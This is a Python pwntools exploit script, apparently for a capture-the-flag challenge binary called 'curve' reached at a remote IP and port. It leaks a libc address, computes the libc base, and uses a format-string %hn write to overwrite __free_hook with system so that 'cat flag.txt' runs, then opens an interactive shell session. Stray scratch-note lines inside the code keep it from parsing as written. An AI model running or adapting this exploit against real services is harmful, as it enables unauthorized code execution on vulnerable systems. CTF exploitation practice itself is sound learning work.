from pwn import *

libc = ELF("./libc-2.31.so")
libc_free_hook_offset = libc.symbols["__free_hook"]
libc_start_main_offset = libc.symbols["__libc_start_main"]
libc_system_offset = libc.symbols["system"]

elf = ELF("./curve")
#p = process("./curve")
p = remote("143.198.127.103", 42004)

#gdb.attach(p, """
#b * main+144
#b * main+201
#b * main+243
#""")

p.recvuntil(b"Input 1:\n")
p.sendline(b"A" * 152)
p.recv(152)
libc_start = u64(p.recv(6).ljust(8, b"\x00"))
print("[-] libc start:", hex(libc_start))

libc_base = libc_start - libc_start_main_offset - 234
libc_free_hook = libc_base + libc_free_hook_offset
print("[-] libc base:", hex(libc_base))
print("[-] libc free hook:", hex(libc_free_hook))


p.sendlineafter(b"Input 2:\n", p64(libc_free_hook) + p64(libc_free_hook + 2) + p64(libc_free_hook + 4))

one_gadget = libc_base + libc_system_offset
one_gadget_low = one_gadget & 0xFFFF
one_gadget_mid = (one_gadget >> 16) & 0xFFFF
one_gadget_high = (one_gadget >> 32) & 0xFFFF
print("[-] One gadget:", hex(one_gadget), one_gadget_high, one_gadget_mid, one_gadget_low)


burek = [
    (one_gadget_low, 8),
    (one_gadget_mid, 9),
    (one_gadget_high, 10),
]



%int(4)x%11$n
%int(11)x%10$n

%int(85)x%9$n


burek = sorted(burek, key=lambda k: k[0])
payload = b"cat flag.txt "
diff = len(payload)
for gadget, offset in burek:
    payload += b"%" \
            + str(gadget - diff).encode() \
            + b"x%" \
            + str(offset).encode() \
            + b"$hn"
    diff += gadget - diff


%n -> 4byte
%hn -> 2 byta
%hhn -> 1byte

print("[-] Payload:", payload)

#payload = b"%" + str(one_gadget_low).encode() + b"x%8$hn" \
#        + b"%" + str(one_gadget_mid - one_gadget_low).encode() + b"x%9$hn" \
#        + b"%" + str(one_gadget_high - one_gadget_mid - one_gadget_low).encode() + b"x%10$hn"

p.sendlineafter(b"Input 3:\n", payload)



p.interactive()
